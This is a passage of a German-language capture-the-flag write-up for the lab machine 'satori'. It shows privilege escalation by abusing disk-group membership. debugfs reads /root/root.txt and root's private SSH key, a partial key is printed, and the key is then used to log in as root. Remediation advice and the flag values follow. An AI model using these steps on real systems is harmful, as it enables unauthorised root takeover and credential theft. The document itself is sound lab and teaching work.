+                    <div class="prompt">yana@satori:~$ <span class="command">export PATH=/usr/sbin:$PATH</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">yana@satori:~$ <span class="command">df -h</span></div>
+                     <pre>
+Filesystem      Size  Used Avail Use% Mounted on
+[...]
+<span class="command">/dev/sda1</span>        11G  2.5G  7.8G  24% /
+[...]
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit `whereis debugfs` wird der Pfad zum `debugfs`-Tool gefunden (`/usr/sbin/debugfs`). Da `/usr/sbin` möglicherweise nicht im Standard-PATH für normale Benutzer ist, wird es mit `export PATH=...` zum PATH hinzugefügt. `df -h` identifiziert die Hauptpartition als `/dev/sda1`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Notwendige Vorbereitungsschritte, um `debugfs` auf das korrekte Device anzuwenden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie nun `debugfs` auf `/dev/sda1`.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">yana@satori:~$ <span class="command">debugfs /dev/sda1</span></div> <span class="password"><-- Option -w für Schreibzugriff fehlt, aber Lesen reicht</span>
+                    <pre>debugfs 1.44.7 (08-Feb-2019)</pre> <span class="password"><-- Version weicht leicht von oben ab, irrelevant</span>
+                     <div class="prompt">debugfs: <span class="command">cat /root/root.txt</span></div>
+                     <pre><span class="password">whoteachbudha</span></pre>
+                     <div class="prompt">debugfs: <span class="command">cat /root/.ssh/id_rsa</span></div>
+                     <pre>
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="password">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span>
+<span class="password">[...]</span>
+<span class="password">gaN4ZcqmaVXfzC0AAAALcm9vdEBzYXRvcmk=</span> <span class="password"><-- Kommentar: root@satori</span>
+<span class="password">-----END OPENSSH PRIVATE KEY-----</span>
+</pre>
+                    <div class="prompt">debugfs: <span class="command">quit</span></div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `debugfs` wird auf `/dev/sda1` gestartet. Da `yana` Mitglied der `disk`-Gruppe ist, hat sie die nötigen Rechte, um auf das Block-Device zuzugreifen. Innerhalb der `debugfs`-Shell werden die normalen Dateisystemberechtigungen umgangen. Mit dem `cat`-Befehl von `debugfs` werden erfolgreich die Root-Flag (`/root/root.txt`) und der private SSH-Schlüssel des Root-Benutzers (`/root/.ssh/id_rsa`) ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Privilege Escalation zu Root erfolgreich durchgeführt! Durch Ausnutzung der `disk`-Gruppenmitgliedschaft konnte direkter Zugriff auf das Dateisystem erlangt und der private Root-SSH-Schlüssel kompromittiert werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopieren Sie den privaten Root-SSH-Schlüssel, speichern Sie ihn auf Ihrem Angreifer-System, setzen Sie die korrekten Berechtigungen (`chmod 600`) und verwenden Sie ihn, um sich als `root` via SSH anzumelden.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie `yana` (und andere nicht administrative Benutzer) aus der `disk`-Gruppe. Überprüfen Sie alle Gruppenmitgliedschaften.</p>
+            <p class="evaluation">**Abschließende Bewertung des Logs:** Der Weg zur Root-Shell über `debugfs` ist klar dokumentiert. Der initiale Zugriff erfolgte wahrscheinlich über den SSH-Schlüssel von `yana`, der über die LFI/SSRF in `stream.php` erlangt wurde, obwohl der FTP-Brute-Force als alternativer, wenn auch redundanter Weg gezeigt wird.</p>
+
+        </section>
+
+         <section id="poc-privesc">
+            <h2>Proof of Concept (Privilege Escalation - debugfs)</h2>
+
+             <p class="analysis"><strong>Kurzbeschreibung:</strong> Der Benutzer `yana`, zu dem der Angreifer initialen Zugriff erlangt hat, ist Mitglied der Systemgruppe `disk`. Diese Mitgliedschaft gewährt direkten Lesezugriff auf Block-Devices wie `/dev/sda1` (die Root-Partition). Das Werkzeug `debugfs`, ein Dateisystem-Debugger, kann verwendet werden, um direkt auf die Datenstruktur des Dateisystems zuzugreifen und dabei die üblichen Zugriffsrechte des Betriebssystems zu umgehen. Durch Ausführen von `debugfs /dev/sda1` und Verwenden des internen `cat`-Befehls kann der Angreifer (als `yana` handelnd) den Inhalt jeder Datei auf dem Dateisystem lesen, einschließlich des privaten SSH-Schlüssels des Root-Benutzers (`/root/.ssh/id_rsa`). Mit diesem Schlüssel kann sich der Angreifer dann als `root` per SSH anmelden.</p>
+
+             <p class="evaluation"><strong>Voraussetzungen:</strong>
+                 <ul>
+                     <li>Shell-Zugriff als Benutzer, der Mitglied der Gruppe `disk` ist (hier `yana`).</li>
+                     <li>Das Werkzeug `debugfs` muss auf dem System installiert sein.</li>
+                     <li>Kenntnis des Block-Devices für das Root-Dateisystem (hier `/dev/sda1`).</li>
+                 </ul>
+             </p>
+
+             <p class="recommendation"><strong>Schritt-für-Schritt Anleitung:</strong>
+                 <ol>
+                     <li>
+                         <strong>Gruppenmitgliedschaft bestätigen (als `yana`):**
+                         <div class="code-block">
+                            <div class="terminal">
+                                 <div class="prompt">yana@satori:~$ <span class="command">id</span></div>
+                                 <pre>uid=1000(yana) gid=1000(yana) groups=1000(yana),<span class="command">6(disk)</span>,[...]</pre>
+                             </div>
+                         </div>
+                    </li>
+                     <li>
+                         <strong>Root-Partition identifizieren (als `yana`):**
+                         <div class="code-block">
+                            <div class="terminal">
+                                 <div class="prompt">yana@satori:~$ <span class="command">df -h /</span></div>
+                                 <pre>Filesystem      Size  Used Avail Use% Mounted on
+<span class="command">/dev/sda1</span>        11G  2.5G  7.8G  24% /</pre>
+                             </div>
+                         </div>
+                    </li>
+                    <li>
+                         <strong>`debugfs` starten und Schlüssel lesen (als `yana`):**
+                         <div class="code-block">
+                             <div class="terminal">
+                                 <div class="prompt">yana@satori:~$ <span class="command">debugfs /dev/sda1</span></div>
+                                 <pre>debugfs [...]</pre>
+                                 <div class="prompt">debugfs: <span class="command">cat /root/.ssh/id_rsa</span></div>
+                                 <pre><span class="password">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+[...]
+<span class="password">-----END OPENSSH PRIVATE KEY-----</span></pre>
+                                 <div class="prompt">debugfs: <span class="command">quit</span></div>
+                             </div>
+                         </div>
+                     </li>
+                     <li>
+                         <strong>Schlüssel speichern und verwenden (Angreifer-System):**
+                         Kopieren Sie den ausgegebenen Schlüssel in eine Datei (z.B. `id_rsa_root`) auf Ihrem System.
+                         <div class="code-block">
+                             <div class="terminal">
+                                <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nano id_rsa_root</span></div> <span class="password"><-- Schlüssel einfügen</span>
+                                 <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">chmod 600 id_rsa_root</span></div>
+                                 <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh -i id_rsa_root root@satori.hmv</span></div>
+                                 <pre>root@satori:~#</pre>
+                             </div>
+                         </div>
+                    </li>
+                 </ol>
+             </p>
+
+             <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Erfolgreicher SSH-Login und Erhalt einer interaktiven Shell als `root`-Benutzer.</p>
+
+             <p class="evaluation"><strong>Beweismittel:</strong> Der aus `debugfs` extrahierte private SSH-Schlüssel und der anschließende erfolgreiche SSH-Login als `root`.</p>
+
+             <p class="recommendation"><strong>Risikobewertung:</strong> Sehr Hoch. Die Mitgliedschaft in der `disk`-Gruppe kompromittiert die Dateisystem-Sicherheit und führt in der Regel direkt zur vollständigen Systemübernahme.</p>
+
+             <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                 <ul>
+                     <li>**Entfernen Sie Benutzer aus der `disk`-Gruppe:** Dies ist die wichtigste Maßnahme. Normale Benutzer benötigen diese Rechte niemals.</li>
+                     <li>**Prinzip der geringsten Rechte:** Weisen Sie Gruppenmitgliedschaften und Berechtigungen restriktiv zu.</li>
+                     <li>**Überwachung:** Überwachen Sie die Verwendung von Tools wie `debugfs` durch unerwartete Benutzer.</li>
+                 </ul>
+             </p>
+         </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/yana/user.txt</div>
+                    <div class="flag-value"><span class="password">HMVEnlightment</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt (via debugfs)</div>
+                    <div class="flag-value"><span class="password">whoteachbudha</span></div>
+                </div>
+            </div>
+        </section>
+  
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 3. März 2021</p> <!-- Korrektes Datum aus FTP-Log extrahiert -->
+    </footer>
+</body>
+</html>
